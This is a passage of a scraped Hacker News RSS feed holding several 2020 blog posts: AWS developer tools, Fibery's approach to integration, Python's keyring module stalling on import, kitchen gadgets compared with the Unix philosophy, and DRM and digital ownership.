<div><figure><img loading="lazy" width="533" height="295" src="https://betterdev.blog/app/uploads/2020/10/aws-toolkit-for-jetbrains.png" alt="" srcset="https://betterdev.blog/app/uploads/2020/10/aws-toolkit-for-jetbrains.png 533w, https://betterdev.blog/app/uploads/2020/10/aws-toolkit-for-jetbrains-300x166.png 300w" sizes="(max-width: 533px) 100vw, 533px"><figcaption>AWS Toolkit for JetBrains menu</figcaption></figure></div>



<p>The plugin works with all JetBrains IDE (IntelliJ, WebStorm, PyCharm, Rider, etc.).</p>



<h3><span id="aws_toolkit_for_vs_code"></span>AWS Toolkit for VS Code<span></span></h3>



<p>The <a href="https://aws.amazon.com/visualstudiocode/"><strong>AWS Toolkit for Visual Studio Code</strong></a> is a little bit younger brother of the Toolkit for JetBrains. Their development goes with similar, but not identical paths. Some features are available sooner in one of them.</p>



<p>I‚Äôm not using VS Code on a daily basis, but the AWS Toolkit for it is one of the reasons I launch it. It provides Amazon States Language graph preview, which is a great help when working a lot with Step Functions.</p>



<div><figure><a href="https://betterdev.blog/app/uploads/2020/10/vscode-step-functions-preview.png" target="_blank" rel="noopener noreferrer"><img loading="lazy" width="1024" height="597" src="https://betterdev.blog/app/uploads/2020/10/vscode-step-functions-preview-1024x597.png" alt="Step Function graph preview in VS Code" srcset="https://betterdev.blog/app/uploads/2020/10/vscode-step-functions-preview-1024x597.png 1024w, https://betterdev.blog/app/uploads/2020/10/vscode-step-functions-preview-300x175.png 300w, https://betterdev.blog/app/uploads/2020/10/vscode-step-functions-preview-768x448.png 768w, https://betterdev.blog/app/uploads/2020/10/vscode-step-functions-preview.png 1275w" sizes="(max-width: 1024px) 100vw, 1024px"></a><figcaption>Step Function graph preview in VS Code (<a href="https://docs.aws.amazon.com/toolkit-for-vscode/latest/userguide/bulding-stepfunctions.html">source</a>)</figcaption></figure></div>



<p>This will stay on the list for now, at least until the <a href="https://github.com/aws/aws-toolkit-jetbrains/issues/584">same feature</a> is not available in the Toolkit for JetBrains.</p>



<h3><span id="serverless_framework_plugin"></span>Serverless Framework plugin<span></span></h3>



<p>The <a href="https://plugins.jetbrains.com/plugin/14537-serverless-framework-completion-navigation-syntax"><strong>Serverless Framework Completion/Navigation/Syntax</strong></a> plugin for IntelliJ provides support for writing Serverless stacks. While rather basic, it can help a lot. First, it warns of references to non-existing files or resources. Furthermore, the ability to click on the resource name or path and jump straight to the code is very useful and minimizes the scrolling and clicking through files.</p>



<h2><span id="architecture_diagrams"></span>Architecture diagrams<span></span></h2>



<p>Picture tells more than a thousand words. And a good software architecture diagram can tell more than any other kind of documentation. Especially when working in microservice or serverless environment.</p>



<h3><span id="omnigraffle"></span><img loading="lazy" width="65" height="65" src="https://betterdev.blog/app/uploads/2020/10/omnigraffle-logo.png" alt=""> OmniGraffle<span></span></h3>



<p>The <strong><a href="https://www.omnigroup.com/omnigraffle">OmniGraffle</a></strong> is a paid and Mac-only application for prototyping, design, and diagramming. My case is the latter and the application does a good job in that area. After remembering only a few shortcuts the work is intuitive and fast. Even if you are pedantic like me and everything on the diagram must be exactly aligned, with OmniGraffle it‚Äôs quick to do.</p>



<div><figure><a href="https://betterdev.blog/app/uploads/2020/10/omnigraffle-example.png" target="_blank" rel="noopener noreferrer"><img loading="lazy" width="1024" height="470" src="https://betterdev.blog/app/uploads/2020/10/omnigraffle-example-1024x470.png" alt="" srcset="https://betterdev.blog/app/uploads/2020/10/omnigraffle-example-1024x470.png 1024w, https://betterdev.blog/app/uploads/2020/10/omnigraffle-example-300x138.png 300w, https://betterdev.blog/app/uploads/2020/10/omnigraffle-example-768x352.png 768w, https://betterdev.blog/app/uploads/2020/10/omnigraffle-example.png 1168w" sizes="(max-width: 1024px) 100vw, 1024px"></a><figcaption>OmniGraffle AWS architecture example</figcaption></figure></div>



<p>The nice feature is the <a href="https://stenciltown.omnigroup.com/">Stenciltown</a> ‚Äì community-driven library of ‚Äústencils‚Äù. Stencils are packs of graphics that you can add and use in the OmniGraffle. Apart from that, there are also paid stencils over the internet.</p>



<p>If you use OmniGraffle and need AWS icons, <a href="https://stenciltown.omnigroup.com/stencils/aws-architecture-icons-light-all-2020-04/">here</a> is a stencil from me.</p>



<p>And if you want to create a stencil on your own, here is my tool that will do it for you: <a href="https://github.com/m-radzikowski/omnigraffle-stencil">OmniGraffle Stencil generator</a>.</p>



<h3><span id="diagrams_net_/_draw_io"></span><img loading="lazy" width="57" height="57" src="https://betterdev.blog/app/uploads/2020/10/diagrams-net-logo.png" alt=""> diagrams.net / draw.io<span></span></h3>



<p>The OmniGraffle app is great to use but has several drawbacks. It‚Äôs for macOS only and paid. Sometimes you cannot expect everyone to use it.</p>



<p>For such cases, I use <a href="https://www.diagrams.net/"><strong>diagrams.net</strong></a> (<a href="https://www.diagrams.net/blog/move-diagrams-net">previously known as draw.io</a>). It‚Äôs free and works in the browser, so everyone can edit the diagrams. And for Confluence, it‚Äôs really worth to buy an add-on that integrates it. Having editable diagrams in the same place as the rest of the documentation is the best thing possible.</p>



<div><figure><a href="https://betterdev.blog/app/uploads/2020/10/diagrams-net-example.png" target="_blank" rel="noopener noreferrer"><img loading="lazy" width="946" height="428" src="https://betterdev.blog/app/uploads/2020/10/diagrams-net-example.png" alt="" srcset="https://betterdev.blog/app/uploads/2020/10/diagrams-net-example.png 946w, https://betterdev.blog/app/uploads/2020/10/diagrams-net-example-300x136.png 300w, https://betterdev.blog/app/uploads/2020/10/diagrams-net-example-768x347.png 768w" sizes="(max-width: 946px) 100vw, 946px"></a><figcaption>diagrams.net AWS architecture example</figcaption></figure></div>



<p>Sadly, in comparison with OmniGraffle, while diagrams.net win in the accessibility category, the usability and user experience is, in my opinion, worse. Not bad, just worse.</p>



<h2><span id="summary"></span>Summary<span></span></h2>



<p>It‚Äôs not an especially long list. There are a lot more tools, toolkits, extensions, and plugins on the internet. From quite a few that I revied and tested only the ones above survived the time trial. Maybe some list of ‚Äútools for AWS that I do not use‚Äù can appear someday?</p>



<p>Of course, apart from AWS-related tools, there are a lot of different ones that I use. But it also may be a topic for another post.</p>



<p>Maybe you have some tools not listed here that you find extremely useful when working with AWS? Or at least ones that solve some minor inconveniences ‚Äì that‚Äôs important as well. If so, let me know in the comments, and I will be happy to check them out!</p>



<p>Toolbox icon in the featured image made by <a href="https://smashicons.com/">Smashicons</a> from <a href="https://www.flaticon.com/">www.flaticon.com</a></p>
</div></div>]]>
            </description>
            <link>https://betterdev.blog/my-aws-toolbox/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24931347</guid>
            <pubDate>Thu, 29 Oct 2020 15:11:50 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Data model extension approach to integration]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24931311">thread link</a>) | @tablet
<br/>
October 29, 2020 | https://blog.fibery.io/fibery-approach-to-integration/ | <a href="https://web.archive.org/web/*/https://blog.fibery.io/fibery-approach-to-integration/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
<p>Fibery is a tool that connects different processes together. Think about Strategic Goals and Product Management, or Customers  Feedback and Ideation. It can replace many work management tools, but not all. Quite often you do want to use another tool like HubSpot, Intercom, or GitHub for a specific or complex process. How to provide natural and seamless connections between all these tools?</p>
<h2>Data Models</h2>
<p><small><a href="https://blog.fibery.io/the-knowledge-organization/">Here is the article</a> that describes various approaches to data models and explains why we selected the flexible one.</small> 
</p>
<p><strong>Data Model</strong> is an abstract model that organizes elements of data and defines how they relate to one another. Check the picture below that shows a simple data model:</p>
<p><span>
      <span></span>
  <img alt="data model" title="data model" src="https://blog.fibery.io/static/4955b0d9871b6c6c4e8624b22b447cb6/99f37/data-model.png" srcset="https://blog.fibery.io/static/4955b0d9871b6c6c4e8624b22b447cb6/6b2ea/data-model.png 275w,
https://blog.fibery.io/static/4955b0d9871b6c6c4e8624b22b447cb6/dd45a/data-model.png 550w,
https://blog.fibery.io/static/4955b0d9871b6c6c4e8624b22b447cb6/99f37/data-model.png 1100w,
https://blog.fibery.io/static/4955b0d9871b6c6c4e8624b22b447cb6/573d3/data-model.png 1650w,
https://blog.fibery.io/static/4955b0d9871b6c6c4e8624b22b447cb6/821da/data-model.png 2200w,
https://blog.fibery.io/static/4955b0d9871b6c6c4e8624b22b447cb6/8078c/data-model.png 2218w" sizes="(max-width: 1100px) 100vw, 1100px" loading="lazy">
    </span></p>
<p>The main elements of the data model are:</p>
<ul>
<li><strong>Type</strong> represents data with fields. Like Type Goal has Name, Description, Deadline, and Priority</li>
<li><strong>Relation</strong> connects Types together. Like Goal has many Features.</li>
<li><strong>App</strong> is just a logical group of Types for convenience.  </li>
</ul>
<p>In most work management tools, data model is fixed. Let‚Äôs say, if you check the picture above, you can‚Äôt introduce User Stories or Epics, you just have Features and Tasks in Product Dev. App.</p>
<h2>A traditional approach to integration</h2>
<p>If you take almost any existing work management software like Trello or Asana, you will see that all integrations are hardcoded. Let‚Äôs say, you can link GitLab Merge Requests to Cards in Trello, but that is not automatic and you can‚Äôt link build status to a Card. Indeed, Trello has its own data model and it‚Äôs hard to extend it with an external tool domain. <strong>Every integration is hardcoded and provides fixed extension points</strong>.</p>
<p>The main problem with this approach is that <strong>the integration creator should foresee all important cases</strong>. Sometimes it‚Äôs easy to do, but in general, it‚Äôs a very hard problem. </p>
<ul>
<li>What if you want to see a list of recent builds with statuses? </li>
<li>What if you want to attach Merge Requests to Features instead of Tasks? </li>
<li>What if you want to visualize the latest Merge Request status for a Bug? </li>
</ul>
<p>What if we‚Äôll not hardcode integrations, but just extend the data model? What if we‚Äôll fetch data from an external system and allow you to do whatever you want with the data: connect entities together, visualize entities, and enhance entities with more data?</p>
<h2>External App ‚Üí Fibery: Extend Data Model</h2>
<p>Fibery has an unfair advantage, it has a flexible data model üòú. It means <strong>Fibery can replicate the data model of any external tool</strong>. For example, it can fetch Companies, Contacts, Conversations, and Tags from Intercom and connect them together. Or it can fetch Projects, Branches, and Merge Requests from GitLab and connect them.</p>
<p><span>
      <span></span>
  <img alt="integration sync1" title="integration sync1" src="https://blog.fibery.io/static/76fb5d26dd57300be53a6a0387baa858/99f37/integration-sync1.png" srcset="https://blog.fibery.io/static/76fb5d26dd57300be53a6a0387baa858/6b2ea/integration-sync1.png 275w,
https://blog.fibery.io/static/76fb5d26dd57300be53a6a0387baa858/dd45a/integration-sync1.png 550w,
https://blog.fibery.io/static/76fb5d26dd57300be53a6a0387baa858/99f37/integration-sync1.png 1100w,
https://blog.fibery.io/static/76fb5d26dd57300be53a6a0387baa858/573d3/integration-sync1.png 1650w,
https://blog.fibery.io/static/76fb5d26dd57300be53a6a0387baa858/821da/integration-sync1.png 2200w,
https://blog.fibery.io/static/76fb5d26dd57300be53a6a0387baa858/31df8/integration-sync1.png 2366w" sizes="(max-width: 1100px) 100vw, 1100px" loading="lazy">
    </span></p>
<p>Usually, you can‚Äôt freely manipulate data from an external system, but in Fibery you can do interesting things. Here are some examples:</p>
<ol>
<li>Automatically connect GitHub Pull Requests to User Stories.</li>
<li>Highlight text in Intercom Chats and create new Features/Bugs/Insights from them.</li>
<li>Automatically connect Chats from Intercom to Accounts from HubSpot CRM.</li>
<li>Create a field on a Feature that shows the status of the last GitLab Merge Request.</li>
<li>Create a chart that shows new HubSpot Accounts registration per month.</li>
<li>Create a Table that shows all GitLab Merge Requests attached to User Stories.</li>
</ol>
<h4>Automatically connect GitHub Pull Requests to User Stories.</h4>
<p>In this video, I show the flow of connecting Pull Requests to User Stories using auto-linking in Fibery.</p>

<h4>Highlight text in Intercom Chats and create new Features/Bugs/Insights from them.</h4>
<p>Here we already exported conversations from Intercom and I attach feedback to an Idea.</p>
<figure>
    <img src="https://blog.fibery.io/3ffce0a89b17fba0ada1779ff6bf4664/intercom-link.gif" alt="Option 2 looks like this: highlight text in Intercom Chats and create new Features/Bugs/Insights from them.">
    <figcaption></figcaption> 
</figure>
<h2>Native and Integration Types: The Great Unification</h2>
<p>It all means that Fibery native data and external systems data is unified, there is no difference between them!</p>
<p><small><b>Type</b> represents data: Task, Feature, Project, Vacation, Meeting, Asset, etc. Integration Types are created from an external system, Native Types are created manually in Fibery. </small> 
</p>
<p>Here is the snapshot of a Fibery workspace. As you see, there is not much difference between Integration and Native Types.</p>
<p><span>
      <span></span>
  <img alt="external data" title="external data" src="https://blog.fibery.io/static/7a21259ac51c142203f150b19aaf58fe/ddced/external-data.jpg" srcset="https://blog.fibery.io/static/7a21259ac51c142203f150b19aaf58fe/35f54/external-data.jpg 275w,
https://blog.fibery.io/static/7a21259ac51c142203f150b19aaf58fe/d7854/external-data.jpg 550w,
https://blog.fibery.io/static/7a21259ac51c142203f150b19aaf58fe/ddced/external-data.jpg 1100w,
https://blog.fibery.io/static/7a21259ac51c142203f150b19aaf58fe/670dc/external-data.jpg 1650w,
https://blog.fibery.io/static/7a21259ac51c142203f150b19aaf58fe/a40a7/external-data.jpg 2200w,
https://blog.fibery.io/static/7a21259ac51c142203f150b19aaf58fe/f145d/external-data.jpg 2320w" sizes="(max-width: 1100px) 100vw, 1100px" loading="lazy">
    </span></p>
<p>Data unification unfolds the whole power of Fibery visualizations, connections, and enhancements for the external data. On an abstract level, you can create Views from it (Table, Board, Timeline), you can create Charts, you can add your own custom fields, thus augmenting imported data.</p>
<figure>
    <span>
      <span></span>
  <img alt="For example, for Intercom you can see a list of Conversations, create a chart that shows the most popular Tags, and connect Conversations to Accounts" title="For example, for Intercom you can see a list of Conversations, create a chart that shows the most popular Tags, and connect Conversations to Accounts" src="https://blog.fibery.io/static/a836119b2b4bbe1bfd098cf1d24948de/99f37/integration-value.png" srcset="https://blog.fibery.io/static/a836119b2b4bbe1bfd098cf1d24948de/6b2ea/integration-value.png 275w,
https://blog.fibery.io/static/a836119b2b4bbe1bfd098cf1d24948de/dd45a/integration-value.png 550w,
https://blog.fibery.io/static/a836119b2b4bbe1bfd098cf1d24948de/99f37/integration-value.png 1100w,
https://blog.fibery.io/static/a836119b2b4bbe1bfd098cf1d24948de/573d3/integration-value.png 1650w,
https://blog.fibery.io/static/a836119b2b4bbe1bfd098cf1d24948de/821da/integration-value.png 2200w,
https://blog.fibery.io/static/a836119b2b4bbe1bfd098cf1d24948de/8aace/integration-value.png 2732w" sizes="(max-width: 1100px) 100vw, 1100px" loading="lazy">
    </span>
    <figcaption>For example, for Intercom you can see a list of Conversations, create a chart that shows the most popular Tags, and connect Conversations to Accounts</figcaption>
  </figure>
<p>From the end-user perspective, internal/external data distinction does not exist, all data is here and readily available. </p>
<p>Here I create a chart that shows new Intercom Companies registration per month.</p>

<p>You can add Integration Types into existing Apps, or you can create new Apps that consist of Integration Types only. </p>
<p>The potential is huge. Eventually, it will be possible to bring all important data from external systems into a single place (Fibery) and connect the data. Let‚Äôs explore just one example.</p>
<p>Imagine, you are a software development company and use tools like GitLab, Intercom, HubSpot &amp; Google Analytics. You decided to use Fibery for work management. What benefits you can have by syncing the data between these external systems in Fibery? </p>
<p>Let‚Äôs focus on Accounts. Accounts are tracked in HubSpot and now you have all of them in Fibery. You can connect all Intercom conversations into Accounts and find the most active customers or leads. You can also connect Google Analytics data and track Accounts activity right there. You can mix all important data about Accounts in a single system.</p>
<p>Now let‚Äôs focus on Features. You can connect Merge Requests to Features and see Feature status. Then you can link feedback on Features from Intercom. Finally, you can track what Accounts requested what Features to make customer discovery calls or notify customers about feature completion.</p>
<figure>
    <span>
      <span></span>
  <img alt="Several external systems are connected together in Fibery" title="Several external systems are connected together in Fibery" src="https://blog.fibery.io/static/7bc86ad310e0b2b2704d48d8c7b453b5/99f37/integration-2.png" srcset="https://blog.fibery.io/static/7bc86ad310e0b2b2704d48d8c7b453b5/6b2ea/integration-2.png 275w,
https://blog.fibery.io/static/7bc86ad310e0b2b2704d48d8c7b453b5/dd45a/integration-2.png 550w,
https://blog.fibery.io/static/7bc86ad310e0b2b2704d48d8c7b453b5/99f37/integration-2.png 1100w,
https://blog.fibery.io/static/7bc86ad310e0b2b2704d48d8c7b453b5/573d3/integration-2.png 1650w,
https://blog.fibery.io/static/7bc86ad310e0b2b2704d48d8c7b453b5/821da/integration-2.png 2200w,
https://blog.fibery.io/static/7bc86ad310e0b2b2704d48d8c7b453b5/8aace/integration-2.png 2732w" sizes="(max-width: 1100px) 100vw, 1100px" loading="lazy">
    </span>
    <figcaption>Several external systems are connected together in Fibery</figcaption>
  </figure>
<p>When you have everything in sync in a single place, it opens up <em>unexpected</em> ways to handle feedback and customers interactions. </p>
<h2>Fibery ‚Üí External App: Actions</h2>
<p><small>NOTE: This part of the integration strategy is not implemented yet. </small> 
</p>
<p>Everything above was about one-way-sync. But how to initiate actions in external systems? For example, create a new Merge Request from a Feature? Send a message to a Slack channel? We are going to solve this via Action concept. </p>
<p><strong>Action</strong> will be a first-class citizen in Fibery ecosystem. Here are some Action properties:</p>
<ul>
<li>Operate on native and integration Types.</li>
<li>Compose new Actions from existing Actions.</li>
<li>Invoke Action from different places: Button, console, Batch action, context menu, API call. </li>
</ul>
<figure>
    <span>
      <span></span>
  <img alt="Action concept and how it interacts with Types, UI, and Rules" title="Action concept and how it interacts with Types, UI, and Rules" src="https://blog.fibery.io/static/b34df8b394ecd5c56c3e7d0e388b04ce/99f37/actions-schema.png" srcset="https://blog.fibery.io/static/b34df8b394ecd5c56c3e7d0e388b04ce/6b2ea/actions-schema.png 275w,
https://blog.fibery.io/static/b34df8b394ecd5c56c3e7d0e388b04ce/dd45a/actions-schema.png 550w,
https://blog.fibery.io/static/b34df8b394ecd5c56c3e7d0e388b04ce/99f37/actions-schema.png 1100w,
https://blog.fibery.io/static/b34df8b394ecd5c56c3e7d0e388b04ce/573d3/actions-schema.png 1650w,
https://blog.fibery.io/static/b34df8b394ecd5c56c3e7d0e388b04ce/821da/actions-schema.png 2200w,
https://blog.fibery.io/static/b34df8b394ecd5c56c3e7d0e388b04ce/8aace/actions-schema.png 2732w" sizes="(max-width: 1100px) 100vw, 1100px" loading="lazy">
    </span>
    <figcaption>Action concept and how it interacts with Types, UI, and Rules</figcaption>
  </figure>
<p>To add Actions for any external system it will be required to implement a basic unified protocol.</p>
<p>This is just a hint into Actions future. Later Actions will become a part of <strong>Automation Rules</strong> module, where we will finally glue together Types, Events, and Actions.</p>
<h2>Conclusion</h2>
<p>We believe <em>Data and Actions unification</em> will empower Fibery to:</p>
<ol>
<li>Fetch all important data from any external system.</li>
<li>Connect data from various systems together, augment the data, and give people more insights into their work processes.</li>
<li>Do many actions from a single place and reduce tools distractions.</li>
</ol>
<p>And for us it will mean that we can implement integrations to the new systems extremely fast üí™.</p>
<p>We just <a href="https://help.fibery.io/en/articles/4539674-integration-basics">released Data Sync for several external Apps: Intercom, GitHub, GitLab and Trello</a>. Next steps are to add more external systems, implement Actions and make everything public to boost third-party integrations.</p>
<p>ü¶ä <a href="https://fibery.io/sign-up">Get your Fibery account</a>.</p></section></div>]]>
            </description>
            <link>https://blog.fibery.io/fibery-approach-to-integration/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24931311</guid>
            <pubDate>Thu, 29 Oct 2020 15:09:06 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[An illustration of why running code during import is a bad idea (and how it hap]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24930905">thread link</a>) | @todsacerdoti
<br/>
October 29, 2020 | https://utcc.utoronto.ca/~cks/space/blog/python/ImportTimeCodeStall | <a href="https://web.archive.org/web/*/https://utcc.utoronto.ca/~cks/space/blog/python/ImportTimeCodeStall">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><h2>An illustration of why running code during <code>import</code> is a bad idea (and how it happens anyway)</h2>

	<p><small>October 29, 2020</small></p>
</div><div><p>It's a piece of received wisdom in Python programming that while
you can make your module run code when it's <code>import</code>'d, you normally
shouldn't. Importing a module is supposed to be both fast and
predictable, doing as little as possible. But this rule is not always
followed, and when it's not followed you can get <a href="https://twitter.com/thatcks/status/1321312639604137986">bad results</a>:</p>

<blockquote><p>If you've remotely logged in to a Fedora machine (and have no console
session there) and the python3-keyring package is installed, 'python3
-c "import keyring"' takes 25 seconds or so as the module tries to
talk to keyrings on import and waits for some long timeouts. Nice
work.</p>
</blockquote>

<p>(The <a href="https://github.com/jaraco/keyring">keyring</a> module (<a href="https://pypi.org/project/keyring/">also</a>) provides "an easy way to access the
system keyring service".)</p>

<p>On the one hand this provides yet another poster child of why running
code on import is very bad, since merely importing a module should
clearly not stop your Python program for 25 seconds. On the other
hand, I think that this case makes an interesting illustration of
how it is possible to drift into this state through a reasonably
sensible API choice.</p>

<p>Keyring has a notion of <em>backends</em>, which actually talk to the
various different system keyring services. To use keyring, you need
to pick a backend to use and initialize it, and by 'you' we mean
'keyring', because people calling keyring just want to use a generic
API without having to care what backend is in use on this system.
So when you import the <code>keyring</code> module, <a href="https://github.com/jaraco/keyring/blob/master/keyring/core.py">core.py</a>
picks and initializes a backend during the import:</p>

<blockquote><pre># init the _keyring_backend
init_backend()
</pre>
</blockquote>

<p>Automatically selecting and initializing a backend on import means
that keyring's API is ready for callers to use right away without
any further work. This is a friendly API, but assumes that everyone
who imports keyring will go on to use it. While this sounds reasonable,
a Python program may only need to talk to the keyring for some
operations under some circumstances, and may mostly never use it.
One such program is <a href="https://github.com/pypa/pip/pull/8687">pip</a>,
which needs the keyring only rarely but imports it all of the time.</p>

<p>(Unconditional imports are the obvious and Pythonic thing to do.
People look at you funny if your program does '<code>import</code>' in a
function or a class, and it's harder to use the result.)</p>

<p>However, selecting the backend on import has a drawback, at least
on Linux, which is that keyring has to figure out which system
keyring services are actually active right now, because in the Linux
way there's more than one of them (keyring supports <a href="https://secretstorage.readthedocs.io/en/latest/">SecretStorage</a> and direct use
of <a href="https://en.wikipedia.org/wiki/KWallet">KWallet</a>, plus third
party plugins). Since keyring has decided to choose the backend it
will use at import time, it has to determine which of its supported
system keyring services are active at import time.</p>

<p>Some of keyring's backends determine whether or not the corresponding
system service is active by trying to make a <a href="https://en.wikipedia.org/wiki/D-Bus">DBus</a> connection to the service.
Under the right (or the wrong) circumstances, <a href="https://github.com/jaraco/keyring/issues/473">this DBus action
can stall for a significant amount of time</a>. For instance, you
can see this in <a href="https://github.com/jaraco/keyring/blob/master/keyring/backends/kwallet.py">the kwallet backend code</a>;
it attempts to get the DBus object /modules/kwalletd5 from
org.kde.kwalletd5. Under some circumstances, this DBus action can
fail only after a long timeout, and now you have a 25 second <code>import</code>
delay.</p>

<p>This import delay isn't a simple case where the keyring module is
running a bunch of heavyweight code. Instead keyring is doing a
potentially dangerous operation by talking to an outside service
during import. It's not necessarily obvious that this is happening,
because you need to understand both what happens in a specific
backend and what's done at import time (and in isolation each piece
sounds sensible). And a lot of time talking to the outside service
will either work fine and be swift, or will fail immediately.</p>
</div></div>]]>
            </description>
            <link>https://utcc.utoronto.ca/~cks/space/blog/python/ImportTimeCodeStall</link>
            <guid isPermaLink="false">hacker-news-small-sites-24930905</guid>
            <pubDate>Thu, 29 Oct 2020 14:37:48 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Single use kitchen gadgets and the Unix philosophy]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24930858">thread link</a>) | @mcrittenden
<br/>
October 29, 2020 | https://critter.blog/2020/10/29/single-use-kitchen-gadgets-and-the-unix-philosophy/ | <a href="https://web.archive.org/web/*/https://critter.blog/2020/10/29/single-use-kitchen-gadgets-and-the-unix-philosophy/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="site-content" role="main">

	
<article id="post-2737">

	
<!-- .entry-header -->

	<div>

		<div>

			
<p>Alton Brown famously hates single use kitchen gadgets, which he calls <em>unitaskers</em>:</p>



<figure><p><span><iframe width="580" height="327" src="https://www.youtube.com/embed/FgFeVlw2Ywg?version=3&amp;rel=1&amp;showsearch=0&amp;showinfo=1&amp;iv_load_policy=1&amp;fs=1&amp;hl=en&amp;autohide=2&amp;wmode=transparent" allowfullscreen="true" sandbox="allow-scripts allow-same-origin allow-popups allow-presentation"></iframe></span>
</p></figure>



<p>And yet the Unix philosophy says that programs should ‚Äúdo one thing and do it well.‚Äù Why does it work for command line tools but not kitchen gadgets?</p>



<p><em>(You may say ‚Äúuh, because kitchen gadgets have nothing to do with command line tools?‚Äù And you‚Äôre right, but shut up. I‚Äôm cooking up a metaphor here.)</em></p>



<p>The answer is that Unix programs are chain-able. They integrate with each other. You can pipe the output from one into the input of another. That‚Äôs actually the lesser known second part of the Unix philosophy: ‚ÄúWrite programs to work together.‚Äù</p>



<p>Kitchen gadgets are standalone. You can‚Äôt hook a strawberry slicer up to an egg cooker and expect magic to happen.</p>



<p>There‚Äôs a lesson here. Standalone development tools with generic inputs and outputs are good. Those tools follow the Unix philosophy. </p>



<p>But standalone development tools that you can‚Äôt pipe together are bad. Those are the single use kitchen gadgets of the development world. It‚Äôd be better to choose a tool that does many things than a tool that does one thing and only works in a silo.</p>



<p>I like to talk about Unix vs. Me-nix vs. We-nix (get it?).</p>



<ul><li><strong>The Unix philosophy: ‚ÄúDo one thing and do it well.‚Äù</strong></li><li><strong>The Me-nix philosophy: ‚ÄúDo one thing and go to hell.‚Äù</strong></li><li><strong>The We-nix philosophy: ‚ÄúDo lots of things pretty well.‚Äù</strong></li></ul>



<p>To take a real life example: say you‚Äôre building a recommendation engine. You could reach for something like AWS Personalize, a single use kitchen gadget (aka a Me-nix tool). Or you could grab something like Neo4j, a graph database that does lots of things including recommendations (aka a We-nix tool).</p>



<p>Go with AWS Personalize and you‚Äôll be happy as long as you‚Äôre in its core use case. But say you grow out of that. Maybe you need to store and retrieve some arbitrary data about the user. Then it‚Äôs time to integrate. </p>



<p>And since integration with AWS Personalize isn‚Äôt as simple as piping, you‚Äôre going to have a bad time. You‚Äôll be dealing with duplicate user records stored in many systems. You‚Äôll need data in one system to inform data in the other. It all gets very mucky.</p>



<p>If only you had ditched the Me-nix tool and reached for the We-nix tool. You could have had a single source of truth for all of that arbitrary data, <em>and</em> generated recommendations based on it. </p>



<p>My rule of thumb is that Unix tools are best, but if you can‚Äôt find one, choose a We-nix tool over a Me-nix tool.</p>





		</div><!-- .entry-content -->

	</div><!-- .post-inner -->

	<!-- .section-inner -->

	
	<!-- .pagination-single -->

	
</article><!-- .post -->

</div></div>]]>
            </description>
            <link>https://critter.blog/2020/10/29/single-use-kitchen-gadgets-and-the-unix-philosophy/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24930858</guid>
            <pubDate>Thu, 29 Oct 2020 14:34:00 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Ownership in the Age of DRM]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24930824">thread link</a>) | @0goel0
<br/>
October 29, 2020 | https://goel.io/drm-ownership | <a href="https://web.archive.org/web/*/https://goel.io/drm-ownership">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody">
    <p>I‚Äôve been thinking about what it means to own something. The definition that resonated the most with me is this<sup><a href="#footnote1">1</a></sup>:</p>

<blockquote>
  <p>You own what you can pass down</p>
</blockquote>

<p>It used to be common decades ago for people to pass down their property including media (vinyl records, disks, cassettes). You paid for hard assets that you owned.</p>

<p>Objectively, it‚Äôs easier to hold on to, and pass down, digital assets - you just have to change the ‚Äúownership‚Äù field in a database, or hand over a hard drive.</p>

<p>Instead, we got <a href="https://www.eff.org/issues/drm">Digital Rights Management</a>. DRM comprises of tools to lock down <em>who</em> has access to content, <em>where</em> it can be accessed, and for <em>how long</em>.</p>

<p>Simply put, if you buy an album on iTunes, it‚Äôs DRM protected. You cannot watch it on an Android device. Legally, you can‚Äôt even share it with your partner or family.</p>

<p>If you buy an ebook on Amazon, you merely get a license to read it. If Amazon decides they don‚Äôt like you as a customer and delete your account, you lose your book. Or, if your Kindle dies, you can‚Äôt just open the book on your computer or phone.</p>

<p>Using DRM, media companies can prosecute anyone that trying to transfer a Blu-Ray movie to their own computer.</p>

<p>That‚Äôs not ownership. In the digital age, we merely borrow when we ‚Äúbuy‚Äù.</p>

<p>To me, I only own media if:</p>

<ul>
  <li>I can store it on any device I own</li>
  <li>I can transfer it freely between devices I own</li>
  <li>I can consume it through any device<sup><a href="#footnote2">2</a></sup></li>
  <li>The seller cannot take it away from me</li>
  <li>I can transfer ownership freely</li>
</ul>

<p>Based on that criteria, the following are not ownership:</p>

<ul>
  <li>Netflix, Spotify, Pandora (is that still a thing) etc</li>
  <li>iTunes</li>
  <li><a href="https://www.salon.com/2013/03/01/do_you_truly_own_your_e_books/">Kindle books</a></li>
  <li>Blu-Ray disks (and some DVDs)</li>
  <li>Gaming console disks, or digital games (Steam)</li>
</ul>

<p>The only media marketplace I use that meets that criteria is <a href="https://bandcamp.com/">Bandcamp</a> where you buy music directly from artists and get to download it.</p>

<p><img src="https://goel.io/assets/img/posts/2020/2020-07-02-ownership-drm.png" alt="">
<em><a href="https://nadasurf.bandcamp.com/">Nada Surf</a> is an awesome alt-rock band!</em></p>

<p>I prefer straight up MP3 files. That‚Äôs what doing digital media the right way looks like.</p>

<p>Don‚Äôt get me wrong. For creators piracy is a big problem. Some common reasons for piracy and illegal media sharing are:</p>

<ul>
  <li>Not available in consumers‚Äô region</li>
  <li>Delayed release in consumers‚Äô region</li>
  <li>Not convenient to purchase</li>
  <li>Not convenient to consume the media (DRM)</li>
</ul>

<p>However, DRM is not a solution. It‚Äôs a duct tape on a crumbling building.</p>

